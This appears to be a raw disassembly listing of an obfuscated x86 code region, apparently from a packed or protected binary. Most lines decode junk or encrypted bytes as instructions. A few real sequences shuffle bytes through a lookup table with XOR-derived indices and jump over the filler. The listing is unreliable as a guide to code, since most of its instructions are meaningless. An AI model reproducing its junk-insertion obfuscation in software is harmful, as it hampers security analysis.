  412bdb:	xacquire xchg DWORD PTR ds:0x9ee3e485,ebp
  412be2:	inc    ebp
  412be3:	aas    
  412be4:	sahf   
  412be5:	jecxz  0x412bd2
  412be7:	sub    eax,0xa034f74d
  412bec:	and    DWORD PTR [ecx-0x52],eax
  412bef:	jmp    0x7817:0x74419d1
  412bf6:	(bad)  
  412bf7:	imul   ebp,DWORD PTR [ebx],0x7297b9fa
  412bfd:	pop    es
  412bfe:	out    0x97,al
  412c00:	test   eax,0x6fb2d4dc
  412c05:	inc    edi
  412c06:	pop    edi
  412c07:	adc    edx,ebx
  412c09:	fxch   st(4)
  412c0b:	(bad)  
  412c0c:	jns    0x412c68
  412c0e:	pop    edx
  412c0f:	lods   eax,DWORD PTR ds:[esi]
  412c10:	xor    ah,BYTE PTR [ebx-0x14]
  412c13:	or     DWORD PTR [esi],ebx
  412c15:	mov    esp,0x2bf91e8
  412c1a:	push   0xffffff8b
  412c1c:	jmp    0x6b8d:0x33a95e4c
  412c23:	test   DWORD PTR [edi-0x662d8e02],0xd60227de
  412c2d:	sbb    DWORD PTR [eax-0x33],0x164b7f29
  412c34:	mov    edx,0x7aff48e1
  412c39:	jmp    0xdb7a:0xa546dfd0
  412c40:	outs   dx,DWORD PTR ds:[esi]
  412c41:	inc    edi
  412c42:	push   0xffffffbe
  412c44:	out    dx,eax
  412c45:	jbe    0x412c8f
  412c47:	mov    DWORD PTR [eax],eax
  412c49:	lahf   
  412c4a:	pop    eax
  412c4b:	fdivr  QWORD PTR [ebx-0x56]
  412c4e:	(bad)  
  412c4f:	cli    
  412c50:	xchg   edi,eax
  412c51:	and    edx,edx
  412c53:	cld    
  412c54:	and    DWORD PTR [edx-0x55c584fb],ebp
  412c5a:	sti    
  412c5b:	fild   DWORD PTR [edi-0x2d]
  412c5e:	fstp   DWORD PTR [ebp+0x21719e55]
  412c64:	sahf   
  412c65:	xchg   esi,eax
  412c66:	push   edi
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [edx],ecx
  412c83:	lods   eax,DWORD PTR ds:[esi]
  412c84:	clc    
  412c85:	push   es
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cab
  412c8f:	repz cld 
  412c91:	xchg   esp,eax
  412c92:	aas    
  412c93:	pop    ecx
  412c94:	xchg   esi,eax
  412c95:	push   esi
  412c96:	addr16 jp 0x412c36
  412c99:	stos   DWORD PTR es:[edi],eax
  412c9a:	retf   0xecb0
  412c9d:	cmp    al,BYTE PTR [edx-0x3c76a340]
  412ca3:	mov    dl,0xbd
  412ca5:	push   0x4f
  412ca7:	hlt    
  412ca8:	or     al,0xcc
  412caa:	and    al,0x21
  412cac:	inc    ebp
  412cad:	jmp    0x8053:0xfb85711a
  412cb4:	mov    bl,0xac
  412cb6:	pop    ebx
  412cb7:	mov    BYTE PTR [ebp+0x69],ah
  412cba:	and    bh,BYTE PTR [ecx]
  412cbc:	int    0xf
  412cbe:	adc    BYTE PTR [esi+0x19be36d0],0xe1
  412cc5:	dec    ebp
  412cc6:	and    ecx,esp
  412cc8:	imul   edi,DWORD PTR [edi],0x4b6df016
  412cce:	scas   al,BYTE PTR es:[edi]
  412ccf:	shl    ebp,0x76
  412cd2:	(bad)  
  412cd3:	cmp    ecx,DWORD PTR [edi]
  412cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cd6:	je     0x412cfd
  412cd8:	ficom  DWORD PTR ds:[edx+edi*8]
  412cdc:	mov    eax,0x90242ecb
  412ce1:	pop    ebx
  412ce2:	ins    DWORD PTR es:[edi],dx
  412ce3:	fstp   DWORD PTR [edx-0x7c]
  412ce6:	mov    edi,0xe1d8ac88
  412ceb:	push   ss
  412cec:	daa    
  412ced:	or     bl,bh
  412cef:	mov    bh,al
  412cf1:	lahf   
  412cf2:	sbb    ah,BYTE PTR [eax+0x55]
  412cf5:	adc    al,0xb0
  412cf7:	pop    esi
  412cf8:	lahf   
  412cf9:	jne    0x412cef
  412cfb:	imul   esp,eax,0x64
  412cfe:	or     BYTE PTR [eax-0x66],0xef
  412d02:	jg     0x412c8d
  412d04:	pop    edi
  412d05:	lods   al,BYTE PTR ds:[esi]
  412d06:	out    0x77,eax
  412d08:	out    dx,al
  412d09:	hlt    
  412d0a:	dec    esp
  412d0b:	(bad)  
  412d0c:	sar    ch,1
  412d0e:	xor    al,dh
  412d10:	jmp    0x79df:0xaf028cd1
  412d17:	out    0x46,al
  412d19:	lea    ebp,[ebp-0x2f6a6df4]
  412d1f:	iret   
  412d20:	sar    ebp,1
  412d22:	ins    BYTE PTR es:[edi],dx
  412d23:	mov    edi,ebp
  412d25:	cmp    eax,0x9ad81d14
  412d2a:	out    0xca,al
  412d2c:	fisub  DWORD PTR [ecx]
  412d2e:	xor    DWORD PTR ds:0x8591a4f0,esp
  412d34:	out    dx,eax
  412d35:	cmp    ah,BYTE PTR [eax]
  412d37:	mov    ds:0xcff9aa4,al
  412d3c:	test   BYTE PTR [esi],bh
  412d3e:	jge    0x412cf2
  412d40:	int    0x3a
  412d42:	mov    cl,dh
  412d44:	ret    
  412d45:	iret   
  412d46:	jnp    0x412cd5
  412d48:	dec    ebp
  412d49:	out    dx,al
  412d4a:	stos   BYTE PTR es:[edi],al
  412d4b:	pusha  
  412d4c:	popa   
  412d4d:	fsub   DWORD PTR [edx+0x54]
  412d50:	lods   eax,DWORD PTR ds:[esi]
  412d51:	and    DWORD PTR [esi],0xc778afa1
  412d57:	push   ds
  412d58:	jne    0x412d42
  412d5a:	jecxz  0x412d96
  412d5c:	xlat   BYTE PTR ds:[ebx]
  412d5d:	xor    cl,BYTE PTR [esi-0x47c19f3e]
  412d63:	push   edx
  412d64:	inc    ecx
  412d65:	in     eax,dx
  412d66:	retf   
  412d67:	iret   
  412d68:	lods   eax,DWORD PTR ds:[esi]
  412d69:	dec    ebp
  412d6a:	dec    ebp
  412d6b:	popf   
  412d6c:	dec    edx
  412d6d:	push   ss
  412d6e:	iret   
  412d6f:	into   
  412d70:	test   DWORD PTR [edi+0x7f7e2175],0x5d8eb965
  412d7a:	daa    
  412d7b:	adc    al,0x9b
  412d7d:	mov    al,0x4e
  412d7f:	fucomi st,st(3)
  412d81:	aaa    
  412d82:	repnz inc edx
  412d84:	or     BYTE PTR [eax],0xd
  412d87:	call   0x832af12e
  412d8c:	xor    esi,DWORD PTR [ecx-0x17]
  412d8f:	xor    eax,0x8d762116
  412d94:	pop    esp
  412d95:	xchg   ecx,eax
  412d96:	cli    
  412d97:	mov    ah,0xd4
  412d99:	xchg   DWORD PTR [ebx],esi
  412d9b:	not    DWORD PTR [eax+0x62]
  412d9e:	inc    esi
  412d9f:	repz jnp 0x412de4
  412da2:	push   0x63bd5129
  412da7:	mov    al,ds:0x622202ad
  412dac:	xor    ch,bl
  412dae:	iret   
  412daf:	rol    DWORD PTR [edx],cl
  412db1:	int3   
  412db2:	mov    ss,WORD PTR [edi-0x2aa80369]
  412db8:	push   edi
  412db9:	pop    ds
  412dba:	retf   0x50d8
  412dbd:	adc    dl,BYTE PTR [edi+0x7f]
  412dc0:	sbb    DWORD PTR [ebx-0x1da48746],ecx
  412dc6:	fwait
  412dc7:	aas    
  412dc8:	cmp    ch,BYTE PTR ds:0x43487875
  412dce:	sti    
  412dcf:	xor    al,0x54
  412dd1:	xchg   ebp,eax
  412dd2:	mov    dl,0x79
  412dd4:	pop    esi
  412dd5:	push   esp
  412dd6:	sbb    ebp,DWORD PTR [eax]
  412dd8:	sahf   
  412dd9:	ret    
  412dda:	pop    ebp
  412ddb:	mov    esi,0xb48ef826
  412de0:	jo     0x412d99
  412de2:	cld    
  412de3:	or     ah,al
  412de5:	adc    eax,0xafccacb7
  412dea:	scas   al,BYTE PTR es:[edi]
  412deb:	repnz sub DWORD PTR [ebx+ebp*4+0x36],esp
  412df0:	mov    eax,0x31b9be8d
  412df5:	pop    ebp
  412df6:	xchg   esp,eax
  412df7:	dec    ebp
  412df8:	loop   0x412e40
  412dfa:	dec    edx
  412dfb:	and    al,0x40
  412dfd:	or     edx,0x6d0567b0
  412e03:	out    dx,eax
  412e04:	dec    eax
  412e05:	cs scas eax,DWORD PTR es:[edi]
  412e07:	icebp  
  412e08:	cwde   
  412e09:	jne    0x412e18
  412e0b:	into   
  412e0c:	jae    0x412e44
  412e0e:	mov    DWORD PTR [edx+0x240a5d2c],ebp
  412e14:	std    
  412e15:	leave  
  412e16:	call   0x9003:0xc6939841
  412e1d:	jge    0x412e84
  412e1f:	jb     0x412e1c
  412e21:	stos   BYTE PTR es:[edi],al
  412e22:	cmp    eax,0x7d4ececc
  412e27:	inc    ebx
  412e28:	repnz lahf 
  412e2a:	add    dl,BYTE PTR [ecx]
  412e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e2e:	add    BYTE PTR [ebp+0x6cfa07fc],dh
  412e34:	clc    
  412e35:	std    
  412e36:	mov    es,WORD PTR [edi+edi*4]
  412e39:	and    DWORD PTR [ebx+edi*1+0x56],eax
  412e3d:	es mov esp,0x4209489b
  412e43:	xor    al,0x74
  412e45:	retf   0xa031
  412e48:	lods   eax,DWORD PTR ds:[esi]
  412e49:	icebp  
  412e4a:	test   al,0x9d
  412e4c:	retf   0x9e05
  412e4f:	loopne 0x412e26
  412e51:	stos   BYTE PTR es:[edi],al
  412e52:	cmp    DWORD PTR [esi+edi*4],ecx
  412e55:	mov    ds:0x393253fe,al
  412e5a:	les    edi,FWORD PTR [esi-0x601456a0]
  412e60:	gs mov dl,0x9b
  412e63:	(bad)  
  412e64:	ffreep st(5)
  412e66:	sub    eax,0x8800cd2f
  412e6b:	(bad)  
  412e6c:	sahf   
  412e6d:	stc    
  412e6e:	xor    BYTE PTR [esi-0x61733a8d],bl
  412e74:	jle    0x412e6f
  412e76:	rcl    DWORD PTR [esi-0x28],cl
  412e79:	scas   al,BYTE PTR es:[edi]
  412e7a:	aaa    
  412e7b:	mov    esp,0x413c2910
  412e80:	cld    
  412e81:	mov    ebp,0x71c0c97f
  412e86:	int    0xa2
  412e88:	(bad)  
  412e89:	jno    0x412eca
  412e8b:	mov    edi,0x908d1cb4
  412e90:	sbb    DWORD PTR ds:0x5ada17f0,edx
  412e96:	push   ebp
  412e97:	mov    DWORD PTR ds:0xa60cecd7,ebx
  412e9d:	(bad)
  412ea0:	adc    DWORD PTR ds:0xb42ae151,eax
  412ea6:	je     0x412f05
  412ea8:	mov    edi,0x734c78d9
  412ead:	iret   
  412eae:	pop    ebp
  412eaf:	sub    edi,esi
  412eb1:	enter  0x2b7f,0xac
  412eb5:	mov    eax,0xc1fcff6c
  412eba:	inc    eax
  412ebb:	xlat   BYTE PTR ds:[ebx]
  412ebc:	sbb    DWORD PTR [eax+0x39],edx
  412ebf:	aam    0xaf
  412ec1:	shl    DWORD PTR [ebp-0x271e86e],0x65
  412ec8:	(bad)  
  412ec9:	xor    ebx,DWORD PTR [edx-0xf5eb4c2]
  412ecf:	in     eax,dx
  412ed0:	fcomi  st,st(3)
  412ed2:	rcr    BYTE PTR [eax],0x2e
  412ed5:	fisubr DWORD PTR [edx]
  412ed7:	and    eax,0xd7303f5c
  412edc:	(bad)  
  412edd:	shl    BYTE PTR [edi],cl
  412edf:	shl    BYTE PTR [eax],0x98
  412ee2:	and    eax,0xe3fcd62e
  412ee7:	mov    eax,0x86c62c42
  412eec:	lahf   
  412eed:	inc    esi
  412eee:	arpl   WORD PTR [edx-0x11],bp
  412ef1:	push   ds
  412ef2:	bound  edx,QWORD PTR [ecx]
  412ef4:	sbb    eax,0x687ad184
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x3a
  412f26:	cmp    al,0x36
  412f28:	adc    ebp,DWORD PTR [ecx+0x75]
  412f2b:	js     0x412fa5
  412f2d:	in     eax,0x7e
  412f2f:	js     0x412fa9
  412f31:	test   DWORD PTR [edi-0x38e4884],ebx
  412f37:	and    eax,DWORD PTR ss:[esi-0x29aa2bb2]
  412f3e:	ins    BYTE PTR es:[edi],dx
  412f3f:	cmp    DWORD PTR [edi],esp
  412f41:	sbb    al,0xe4
  412f43:	pop    ss
  412f44:	jge    0x412ed9
  412f46:	pop    es
  412f47:	pop    esi
  412f48:	cli    
  412f49:	push   edx
  412f4a:	ds sub bh,al
  412f4d:	outs   dx,BYTE PTR ds:[esi]
  412f4e:	mov    cl,BYTE PTR [ebx+edi*4-0x6b]
  412f52:	into   
  412f53:	and    bh,0x8e
  412f56:	dec    eax
  412f57:	inc    ecx
  412f58:	int3   
  412f59:	inc    edi
  412f5a:	push   ebp
  412f5b:	mov    eax,ds:0xb0591ccc
  412f60:	leave  
  412f61:	jae    0x412fd4
  412f63:	rol    DWORD PTR [eax+0x3cc29e9c],1
  412f69:	xchg   ebx,eax
  412f6a:	ja     0x412f76
  412f6c:	inc    edx
  412f6d:	es inc edx
  412f6f:	and    ecx,DWORD PTR [eax]
  412f71:	pshufw mm6,QWORD PTR [ebp+0x22],0x3d
  412f76:	jo     0x412f6b
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	jmp    0x5ba8:0x1f60b0e6
  412f80:	(bad)
  412f84:	jecxz  0x412f26
  412f86:	jmp    esp
  412f88:	pusha  
  412f89:	jbe    0x412f6c
  412f8b:	sub    al,0xb9
  412f8d:	inc    esi
  412f8e:	fnstcw WORD PTR [edi+0x71ae94dc]
  412f94:	push   ebp
  412f95:	cmp    DWORD PTR [ebp-0x58cd76b],ebx
  412f9b:	lods   eax,DWORD PTR ds:[esi]
  412f9c:	push   0x5a0e5f12
  412fa1:	scas   al,BYTE PTR es:[edi]
  412fa2:	idiv   al
  412fa4:	in     eax,0x99
  412fa6:	mov    esp,0xf672abfc
  412fab:	in     al,0xa0
  412fad:	rcr    DWORD PTR [ebp+0x64],cl
  412fb0:	xor    al,0x53
  412fb2:	adc    ch,BYTE PTR [ebx+0x27817865]
  412fb8:	lods   eax,DWORD PTR ds:[esi]
  412fb9:	adc    al,0x90
  412fbb:	ss jnp 0x413030
  412fbe:	mov    esi,0xc9ca06c0
  412fc3:	push   cs
  412fc4:	pop    ss
  412fc5:	int3   
  412fc6:	std    
  412fc7:	loop   0x413025
  412fc9:	shl    BYTE PTR [edx],0xbb
  412fcc:	mov    al,0x22
  412fce:	xchg   esp,eax
  412fcf:	sar    DWORD PTR [ebx],cl
  412fd1:	mov    ebp,0xa4fae8e7
  412fd6:	pushf  
  412fd7:	dec    esp
  412fd8:	pop    edi
  412fd9:	test   eax,0x9280e4c6
  412fde:	mov    eax,0x38d60421
  412fe3:	jecxz  0x413014
  412fe5:	and    ebx,ecx
  412fe7:	pop    edi
  412fe8:	shl    ecx,cl
  412fea:	sahf   
  412feb:	inc    esp
  412fec:	and    ebp,ebx
  412fee:	jle    0x41302a
  412ff0:	dec    esp
  412ff1:	xor    eax,ebp
  412ff3:	call   0x7cfc4569
  412ff8:	(bad)  
  412ff9:	and    DWORD PTR [esi+0x5b],esi
  412ffc:	fwait
  412ffd:	(bad)  
  412ffe:	ja     0x41306e
  413000:	not    BYTE PTR [ecx]
  413002:	mov    ds:0x70ac6575,eax
  413007:	fs mov dl,0x65
  41300a:	rcr    BYTE PTR [eax+edi*2+0x4fff19c3],0x9f
  413012:	push   esi
  413013:	mov    edi,0x1fa4a95f
  413018:	add    BYTE PTR [esi-0x34df31ba],bl
  41301e:	pop    esp
  41301f:	test   DWORD PTR [eax+0x1b793a38],ebx
  413025:	pop    ebx
  413026:	sub    DWORD PTR [esi-0x296a6498],0x97beb81a
  413030:	jge    0x412fbb
  413032:	push   ebx
  413033:	jnp    0x41307b
  413035:	adc    eax,0x9abd9be7
  41303a:	inc    esi
  41303b:	call   0x9eee9c19
  413040:	xchg   ebx,eax
  413041:	push   esp
  413042:	push   esp
  413043:	push   esp
  413044:	jmp    0x8ba51161
  413049:	push   0x3f
  41304b:	xchg   edi,eax
  41304c:	pop    es
  41304d:	cmovs  ebx,DWORD PTR [ecx]
  413050:	das    
  413051:	(bad)  
  413052:	mov    ah,0x6c
  413054:	aaa    
  413055:	scas   al,BYTE PTR es:[edi]
  413056:	(bad)  
  413057:	dec    esp
  413058:	or     bh,dl
  41305a:	leave  
  41305b:	mov    bl,0x3a
  41305d:	enterw 0x5942,0xf5
  413062:	(bad)  
  413063:	stc    
  413064:	push   esp
  413065:	push   0xffffffd3
  413067:	or     dh,BYTE PTR [edx]
  413069:	into   
  41306a:	inc    esi
  41306b:	addr16 pop es
  41306d:	hlt    
  41306e:	push   ds
  41306f:	ins    DWORD PTR es:[edi],dx
  413070:	sbb    DWORD PTR [edi],ebx
  413072:	pop    ebx
  413073:	inc    eax
  413074:	add    al,0xea
  413076:	mov    ds:0x2ad37432,al
  41307b:	mov    esp,0x65df86fc
  413080:	pop    ds
  413081:	(bad)  
  413082:	and    BYTE PTR [eax+0x22],dh
  413085:	and    DWORD PTR [eax],esp
  413087:	(bad)  
  413088:	sbb    edi,edx
  41308a:	dec    edi
  41308b:	outs   dx,DWORD PTR ds:[esi]
  41308c:	gs pop ss
  41308e:	adc    eax,0xaa5658c8
  413093:	fsubr  QWORD PTR [ebp-0x17]
  413096:	push   eax
  413097:	mov    cl,0xcd
  413099:	pop    ecx
  41309a:	pop    ds
  41309b:	or     DWORD PTR [eax],edx
  41309d:	pushf  
  41309e:	jno    0x413029
  4130a0:	mov    esp,DWORD PTR [eax+0x6db89c3f]
  4130a6:	cld    
  4130a7:	mov    ebx,0x16e78405
  4130ac:	cdq    
  4130ad:	int    0x32
  4130af:	cld    
  4130b0:	xchg   DWORD PTR [edi-0x50407d90],ebx
  4130b6:	aam    0xb6
  4130b8:	out    dx,eax
  4130b9:	aam    0x52
  4130bb:	loopne 0x41310b
  4130bd:	lds    esp,FWORD PTR [ecx]
  4130bf:	adc    BYTE PTR [eax+eiz*2],ch
  4130c2:	retf   0x63a6
  4130c5:	rol    DWORD PTR [edi-0xa],0x1f
  4130c9:	pop    ebp
  4130ca:	mov    edx,0x41d5d56d
  4130cf:	push   esi
  4130d0:	jg     0x413064
  4130d2:	test   eax,esi
  4130d4:	imul   esi,DWORD PTR [ebx+ecx*2],0xc0b966a5
  4130db:	push   ebp
  4130dc:	loopne 0x413108
  4130de:	mov    ds:0x7571bef5,eax
  4130e3:	jmp    0x4cba:0xb0a21a9b
  4130ea:	fst    QWORD PTR [ecx+edi*2+0x8]
  4130ee:	xchg   ecx,eax
  4130ef:	pushf  
  4130f0:	sub    BYTE PTR [esi+0x3aa1d8dd],dl
  4130f6:	retf   
  4130f7:	fdiv   QWORD PTR [ebp+0x297858f4]
  4130fd:	(bad)  
  4130fe:	shl    edi,0x3f
  413101:	push   esi
  413102:	xor    eax,0x9635728e
  413107:	push   edx
  413108:	(bad)  
  413109:	loopne 0x413113
  41310b:	retf   
  41310c:	jbe    0x41312b
  41310e:	clc    
  41310f:	push   esp
  413110:	push   edi
  413111:	data16 mov fs:0x900e774a,al
  413118:	std    
  413119:	push   edi
  41311a:	jne    0x41309e
  41311c:	xchg   ecx,ebx
  41311e:	ror    BYTE PTR [esi+0x30],cl
  413121:	adc    ch,ah
  413123:	mov    esi,0x3b9eb4c2
  413128:	adc    al,0x86
  41312a:	jmp    0xf78ed2b7
  41312f:	(bad)  
  413131:	cmp    eax,0xeeae4d8d
  413136:	ret    
  413137:	pop    es
  413138:	cwde   
  413139:	mov    bl,0x1d
  41313b:	jecxz  0x413171
  41313d:	jmp    0x41312e
  41313f:	aad    0x43
  413141:	inc    edi
  413142:	in     al,dx
  413143:	and    DWORD PTR [eax-0x5454c32e],eax
  413149:	add    ecx,DWORD PTR [eax-0x2]
  41314c:	xchg   esi,eax
  41314d:	int    0xf9
  41314f:	push   esi
  413150:	pop    es
  413151:	test   BYTE PTR [edx+0x3d8b0f6a],bh
  413157:	sub    esi,eax
  413159:	mov    ds:0xf818cd3,al
  41315e:	sbb    BYTE PTR [ecx+0x5d],bh
  413161:	rcl    DWORD PTR [edx+0x3e68b56f],cl
  413167:	xor    esi,eax
  413169:	mov    cs:0x9e3adfc,eax
  41316f:	push   edi
  413170:	aad    0x5c
  413172:	enter  0x8c37,0xff
  413176:	and    BYTE PTR [esi],cl
  413178:	iret   
  413179:	daa    
  41317a:	mov    edx,DWORD PTR [ecx]
  41317c:	sub    al,BYTE PTR [edi]
  41317e:	jge    0x41314f
  413180:	jp     0x41310a
  413182:	mov    eax,0x52c779cf
  413187:	arpl   WORD PTR [ecx-0x13adbced],sp
  41318d:	outs   dx,BYTE PTR ds:[esi]
  41318e:	(bad)  
  41318f:	rcr    BYTE PTR [esi-0x3d],cl
  413192:	enter  0xcd08,0xd9
  413196:	aaa    
  413197:	mov    ecx,0xe193c0be
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	and    bh,BYTE PTR [ebx-0x1e]
  4131ca:	dec    ecx
  4131cb:	(bad)  
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x4131de
  4131d4:	std    
  4131d5:	outs   dx,BYTE PTR es:[esi]
  4131d7:	out    0x1d,eax
  4131d9:	rol    esi,1
  4131db:	push   ds
  4131dc:	adc    ebx,DWORD PTR ds:0xcc80d259
  4131e2:	add    bl,BYTE PTR [ebx-0x42bcab30]
  4131e8:	cmp    al,0xc2
  4131ea:	into   
  4131eb:	jne    0x413219
  4131ed:	sbb    DWORD PTR [ecx],edx
  4131ef:	pop    es
  4131f0:	adc    al,BYTE PTR [edx+0x6ab1fe0d]
  4131f6:	ror    ah,1
  4131f8:	sub    dh,BYTE PTR [ebx-0x384b6cf3]
  4131fe:	outs   dx,BYTE PTR ds:[esi]
  4131ff:	xor    eax,0xfdb97b92
  413204:	(bad)  
  413205:	stos   DWORD PTR es:[edi],eax
  413206:	popa   
  413207:	adc    ah,BYTE PTR [ecx-0x70]
  41320a:	daa    
  41320b:	rol    BYTE PTR [ebx+0x69],cl
  41320e:	mov    cs,ebp
  413210:	outs   dx,BYTE PTR ds:[esi]
  413211:	push   ds
  413212:	in     eax,0x8c
  413214:	xor    ah,BYTE PTR [eax-0x2d]
  413217:	cmp    al,0x57
  413219:	lahf   
  41321a:	fadd   DWORD PTR [eax]
  41321c:	xchg   ecx,eax
  41321d:	iret   
  41321e:	adc    DWORD PTR [edi+0x55],esi
  413221:	ja     0x413234
  413223:	dec    edx
  413224:	mov    al,0x87
  413226:	ret    0x4754
  413229:	inc    esi
  41322a:	inc    esp
  41322b:	pop    es
  41322c:	xor    BYTE PTR ds:0x676ee493,dh
  413232:	(bad)
  413235:	std    
  413236:	cmp    ebp,ecx
  413238:	adc    dh,BYTE PTR [eax]
  41323a:	ss cmp eax,0x4b62e85
  413240:	loopne 0x4131df
  413242:	lea    ebx,[edx]
  413244:	mov    BYTE PTR [edx-0x1c],al
  413247:	inc    edi
  413248:	mov    ecx,0x103f8e50
  41324d:	mov    ds:0xc0d4b77f,al
  413252:	xchg   ecx,eax
  413253:	and    al,0x1c
  413255:	out    0xb,eax
  413257:	jge    0x4132d6
  413259:	(bad)  
  41325a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41325b:	nop
  41325c:	mov    dl,0xc5
  41325e:	out    dx,al
  41325f:	sbb    eax,eax
  413261:	and    eax,DWORD PTR [ebx]
  413263:	adc    BYTE PTR [ecx+ecx*4-0x3fd56387],al
  41326a:	mov    al,ds:0x404c0947
  41326f:	mov    al,ds:0xdc53ef40
  413274:	nop
  413275:	out    0xca,eax
  413277:	or     ah,BYTE PTR [edx]
  413279:	xor    BYTE PTR [ebp+0x29],dl
  41327c:	inc    ebp
  41327d:	mov    edx,0x8ecbf126
  413282:	and    BYTE PTR [ebx],cl
  413284:	and    al,0x68
  413286:	loopne 0x41325e
  413288:	enter  0xc029,0xbc
  41328c:	jl     0x413265
  41328e:	out    dx,eax
  41328f:	icebp  
  413290:	mov    cl,0xf9
  413292:	sub    DWORD PTR [esi-0x11],ebx
  413295:	mov    al,ds:0x9a59a2fa
  41329a:	shl    DWORD PTR [ebp+0x67],cl
  41329d:	pop    es
  41329e:	xchg   BYTE PTR [edi-0x1f],bh
  4132a1:	aas    
  4132a2:	sbb    dh,BYTE PTR [edx+0x16]
  4132a5:	mov    dh,0xed
  4132a7:	cwde   
  4132a8:	pop    eax
  4132a9:	scas   al,BYTE PTR es:[edi]
  4132aa:	cs ffreep st(1)
  4132ad:	jl     0x413291
  4132af:	mov    ebp,0xa37126fa
  4132b4:	and    BYTE PTR [ebx+eax*4+0x50e7e77f],al
  4132bb:	pushf  
  4132bc:	les    edi,FWORD PTR ds:0xca7d0da1
  4132c2:	jns    0x4132df
  4132c4:	adc    eax,0xe2c8ca7
  4132c9:	xor    DWORD PTR [ecx-0x38],0x28
  4132cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ce:	rcr    DWORD PTR [esi+0x22b61c72],1
  4132d4:	lods   eax,DWORD PTR ds:[esi]
  4132d5:	sbb    dh,BYTE PTR [edi]
  4132d7:	mov    eax,0xcde32b44
  4132dc:	imul   esi,DWORD PTR [ecx],0x4580ea30
  4132e2:	sar    BYTE PTR [edx+0x7],0x1b
  4132e6:	call   0x8b833507
  4132eb:	jb     0x4132ba
  4132ed:	mov    ch,0x49
  4132ef:	inc    eax
  4132f0:	lock jno 0x4132ac
  4132f3:	mov    dl,0x80
  4132f5:	je     0x413293
  4132f7:	inc    edi
  4132f8:	jae    0x4132b8
  4132fa:	rcl    DWORD PTR [edi+0x246b2910],1
  413300:	pushf  
  413301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413302:	in     al,dx
  413303:	inc    eax
  413304:	inc    esp
  413305:	dec    BYTE PTR [ebx-0x6f]
  413308:	inc    esp
  413309:	das    
  41330a:	sub    cl,BYTE PTR [edx+0xfbe74cf]
  413310:	in     al,dx
  413311:	xor    esp,DWORD PTR [eax-0x73]
  413314:	aaa    
  413315:	pushf  
  413316:	bound  eax,QWORD PTR [esi]
  413318:	adc    edi,DWORD PTR [eax-0x6e]
  41331b:	mov    al,0x11
  41331d:	int    0x16
  41331f:	dec    esi
  413320:	or     eax,0xcef71d3b
  413325:	aaa    
  413326:	mov    edi,0x5981eacb
  41332b:	add    al,0xa5
  41332d:	mov    DWORD PTR [ecx-0x24],esp
  413330:	gs mov dl,0xc6
  413333:	(bad)  
  413334:	ja     0x41331e
  413336:	dec    ecx
  413337:	cs jmp 0x7dab6e26
  41333d:	inc    edx
  41333e:	or     DWORD PTR [esi+0x1eafbb33],edx
  413344:	lock jnp 0x41338d
  413347:	cmp    al,0xa1
  413349:	(bad)  
  41334a:	xlat   BYTE PTR ds:[ebx]
  41334b:	loope  0x413395
  41334d:	rcl    BYTE PTR ds:0xd63b4a4,cl
  413353:	in     al,dx
  413354:	enter  0x129e,0xa1
  413358:	lods   eax,DWORD PTR ds:[esi]
  413359:	fwait
  41335a:	inc    esi
  41335b:	iret   
  41335c:	sbb    al,0x1e
  41335e:	fimul  WORD PTR [ecx]
  413360:	and    DWORD PTR [ecx+eax*4+0x102bbe5f],0xffffff9a
  413368:	js     0x413355
  41336a:	pusha  
  41336b:	mov    eax,0x16dac6f9
  413370:	shl    DWORD PTR [eax+0x7d],0x43
  413374:	in     al,0x61
  413376:	iret   
  413377:	sbb    BYTE PTR [esi],dh
  413379:	mov    dh,0xcd
  41337b:	popf   
  41337c:	pop    ss
  41337d:	jl     0x20771e6d
  413383:	xchg   edi,eax
  413384:	pushf  
  413385:	pop    ebp
  413386:	adc    esi,esp
  413388:	mov    dl,al
  41338a:	shl    BYTE PTR [ecx-0x13e59e73],cl
  413390:	xchg   esp,eax
  413391:	nop
  413392:	lods   al,BYTE PTR ds:[esi]
  413393:	ss out dx,al
  413395:	repz adc dl,dl
  413398:	sub    DWORD PTR [eax+edx*1-0x5f],edi
  41339c:	ret    0x36
  41339f:	call   0x1e767e22
  4133a4:	clc    
  4133a5:	icebp  
  4133a6:	and    eax,0x3aed027b
  4133ab:	loopne 0x4133c5
  4133ad:	scas   eax,DWORD PTR es:[edi]
  4133ae:	mov    ebx,0x1aba6531
  4133b3:	inc    ebp
  4133b4:	mov    bh,0x39
